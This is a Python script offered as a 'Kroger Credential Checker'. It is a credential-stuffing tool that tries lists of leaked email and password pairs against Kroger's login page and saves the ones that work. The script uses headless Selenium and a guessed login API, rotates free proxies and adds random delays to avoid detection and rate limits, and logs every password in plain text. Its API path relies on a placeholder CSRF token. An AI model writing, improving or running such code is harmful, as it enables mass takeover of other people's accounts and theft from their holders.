import requests
from fp.fp import FreeProxy
import random
import time
import json
import logging
from typing import List, Dict, Tuple
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('kroger_checker.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class KrogerChecker:
    def __init__(self, use_proxy: bool = True, headless: bool = True):
        self.use_proxy = use_proxy
        self.headless = headless
        self.proxy = None
        self.session = requests.Session()
        self.driver = None
        self.valid_creds = []
        self.invalid_creds = []
        
        if self.use_proxy:
            self._rotate_proxy()
            
    def _rotate_proxy(self):
        """Get a fresh proxy from FreeProxy"""
        try:
            self.proxy = FreeProxy(rand=True, timeout=1).get()
            logger.info(f"Using proxy: {self.proxy}")
            self.session.proxies = {
                'http': self.proxy,
                'https': self.proxy
            }
        except Exception as e:
            logger.warning(f"Failed to get proxy: {e}")
            self.proxy = None
            
    def _init_selenium(self):
        """Initialize Selenium WebDriver with proxy if enabled"""
        options = webdriver.ChromeOptions()
        if self.headless:
            options.add_argument('--headless')
        options.add_argument('--disable-gpu')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        
        if self.use_proxy and self.proxy:
            options.add_argument(f'--proxy-server={self.proxy}')
            
        self.driver = webdriver.Chrome(options=options)
        self.driver.set_page_load_timeout(30)
        
    def _check_with_selenium(self, email: str, password: str) -> bool:
        """Check credentials using Selenium (more reliable for JS-heavy sites)"""
        try:
            if not self.driver:
                self._init_selenium()
                
            self.driver.get('https://www.kroger.com/signin')
            
            # Fill login form
            email_field = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.ID, 'email'))
            )
            email_field.send_keys(email)
            
            password_field = self.driver.find_element(By.ID, 'password')
            password_field.send_keys(password)
            
            # Click sign in button
            signin_button = self.driver.find_element(By.XPATH, '//button[@type="submit"]')
            signin_button.click()
            
            # Check for successful login (wait for redirect or profile element)
            try:
                WebDriverWait(self.driver, 10).until(
                    EC.url_contains('account')
                )
                return True
            except TimeoutException:
                # Check for error message
                try:
                    error_msg = self.driver.find_element(By.CSS_SELECTOR, '.error-message').text
                    logger.debug(f"Login failed: {error_msg}")
                    return False
                except NoSuchElementException:
                    return False
                    
        except Exception as e:
            logger.error(f"Selenium check error: {e}")
            return False
            
    def _check_with_api(self, email: str, password: str) -> bool:
        """Check credentials using API requests (faster but may be blocked)"""
        try:
            # First get CSRF token
            login_page = self.session.get('https://www.kroger.com/signin')
            if login_page.status_code != 200:
                logger.debug(f"Failed to get login page: {login_page.status_code}")
                return False
                
            # Extract CSRF token (implementation may vary)
            # This is a placeholder - actual implementation needs to inspect Kroger's auth flow
            csrf_token = "extracted_token"
            
            # Submit login request
            payload = {
                'email': email,
                'password': password,
                '_csrf': csrf_token
            }
            
            response = self.session.post(
                'https://www.kroger.com/auth/api/login',
                json=payload,
                headers={
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                }
            )
            
            if response.status_code == 200:
                return True
            return False
                
        except Exception as e:
            logger.error(f"API check error: {e}")
            return False
            
    def check_credentials(self, email: str, password: str) -> bool:
        """Check if credentials are valid using best available method"""
        logger.info(f"Checking: {email}:{password}")
        
        # Try API first (faster)
        api_valid = self._check_with_api(email, password)
        if api_valid:
            logger.info(f"VALID (API): {email}:{password}")
            return True
            
        # Fall back to Selenium if API fails
        selenium_valid = self._check_with_selenium(email, password)
        if selenium_valid:
            logger.info(f"VALID (Selenium): {email}:{password}")
            return True
            
        logger.info(f"INVALID: {email}:{password}")
        return False
        
    def check_single(self, email: str, password: str):
        """Check a single credential pair"""
        is_valid = self.check_credentials(email, password)
        result = {
            'email': email,
            'password': password,
            'valid': is_valid,
            'proxy': self.proxy
        }
        
        if is_valid:
            self.valid_creds.append(result)
        else:
            self.invalid_creds.append(result)
            
        return result
        
    def check_bulk(self, credentials: List[Dict[str, str]]):
        """Check multiple credentials from a list"""
        results = []
        for cred in credentials:
            result = self.check_single(cred['email'], cred['password'])
            results.append(result)
            
            # Rotate proxy between requests if enabled
            if self.use_proxy and random.random() > 0.7:  # 30% chance to rotate
                self._rotate_proxy()
                
            # Add delay to avoid rate limiting
            time.sleep(random.uniform(1, 3))
            
        return results
        
    def save_results(self):
        """Save results to JSON files"""
        with open('valid_credentials.json', 'w') as f:
            json.dump(self.valid_creds, f, indent=2)
            
        with open('invalid_credentials.json', 'w') as f:
            json.dump(self.invalid_creds, f, indent=2)
            
        logger.info(f"Saved {len(self.valid_creds)} valid and {len(self.invalid_creds)} invalid credentials")
        
    def close(self):
        """Clean up resources"""
        if self.driver:
            self.driver.quit()
        self.session.close()

def main():
    print("Kroger Credential Checker")
    print("1. Check single credential")
    print("2. Check bulk credentials from file")
    
    choice = input("Select option (1/2): ")
    
    checker = KrogerChecker(use_proxy=True, headless=True)
    
    try:
        if choice == '1':
            email = input("Email: ")
            password = input("Password: ")
            result = checker.check_single(email, password)
            print("\nResult:")
            print(json.dumps(result, indent=2))
            
        elif choice == '2':
            file_path = input("Enter credentials file path (JSON format): ")
            try:
                with open(file_path) as f:
                    credentials = json.load(f)
                    
                print(f"Checking {len(credentials)} credentials...")
                results = checker.check_bulk(credentials)
                
                print("\nSummary:")
                print(f"Valid: {len(checker.valid_creds)}")
                print(f"Invalid: {len(checker.invalid_creds)}")
                
                checker.save_results()
                
            except Exception as e:
                logger.error(f"Error loading credentials file: {e}")
                
        else:
            print("Invalid choice")
            
    finally:
        checker.close()

if __name__ == '__main__':
    main()